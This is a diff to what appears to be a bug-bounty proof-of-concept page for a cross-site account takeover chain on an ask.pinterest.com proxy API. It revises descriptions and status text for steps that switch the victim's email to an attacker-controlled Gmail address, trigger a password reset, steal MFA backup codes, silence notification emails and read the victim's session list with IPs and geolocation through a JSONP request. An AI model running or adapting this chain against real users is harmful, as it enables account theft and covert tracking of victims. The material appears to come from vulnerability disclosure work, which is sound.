@@ -158,7 +158,7 @@
 
   <div class="step">
     <h2><span class="n"></span>Recon: session inventory (JSONP read)</h2>
-    <p class="desc">Every active session with its IP, geolocation and device. After takeover the attacker can revoke the victim's devices one by one via <code>DELETE /sessions/{id}/</code> through the same proxy, keeping only the attacker's own session.</p>
+    <p class="desc">Every active session with its IP, geolocation and device. Post-takeover the attacker logs in with the reset password and revokes the victim's devices one at a time from that first-party session (the delete is a true HTTP DELETE, which a cross-site form cannot send — so eviction is a post-takeover step, not part of the CSRF chain). The inventory itself is the cross-site prize: it tells the attacker exactly which devices will notice.</p>
     <div class="req"><span class="m">GET</span> <span class="u">https://ask.pinterest.com/api/proxy/pinterest/sessions/</span>?callback=<span class="c">cb</span></div>
     <p class="state wait" id="st8">waiting&hellip;</p>
     <pre id="out8">&hellip;</pre>
@@ -178,7 +178,7 @@
     <li><b>The account email is the attacker's plus-address</b> (step 4&ndash;5): a fresh <code>bughunter333333+&lt;random&gt;@gmail.com</code> per run, all folding into <code>bughunter333333@gmail.com</code>. Every future account email is attacker-owned.</li>
     <li><b>A password reset already dispatched</b> to that mailbox (step 6): following the link and setting a password finishes the takeover and logs the victim out.</li>
     <li><b>The MFA backup codes</b> (step 7): one-time second factors, minted and stolen without any re-authentication.</li>
-    <li><b>The full session inventory</b> (step 8): devices, IPs and geolocation, with a per-session revocation primitive to evict the victim silently.</li>
+    <li><b>The full session inventory</b> (step 8): devices, IPs and geolocation &mdash; the attacker knows exactly which devices to evict after logging in with the reset password (eviction is a true DELETE, done first-party post-takeover).</li>
     <li><b>Optional email notifications disabled first</b> (step 3): the account is switched to only-required mail with no prompt, so almost every email the account would send goes quiet. The security change-of-email alert itself is not suppressible &mdash; verified against the settings surface &mdash; and remains the victim's only signal.</li>
   </ul>
 </div>
@@ -502,7 +502,7 @@ async function runFull() {
     ? 'Account email now ' + ATTACKER_MAILBOX + ' (delivers to ' + ATTACKER_BASE + '). ' +
       'A password reset is on its way there; opening that link and setting a password finishes the takeover. ' +
       (codes && codes.length ? 'Stolen MFA backup codes: ' + codes.join(', ') + '. ' : '') +
-      (sess ? sess.length + ' victim session(s) inventoried, revocable one by one. ' : '') +
+      (sess ? sess.length + ' victim session(s) inventoried with IPs and geolocation, for post-takeover eviction. ' : '') +
       'Notification silence ran first (step 3): every optional email category is dark, though the security change-of-email alert itself still fires (not suppressible, verified). ' +
       'Elapsed ' + ((Date.now() - t0) / 1000).toFixed(1) + 's.'
     : 'The email change did not take. C52 may be patched or rate-limited for this account.';
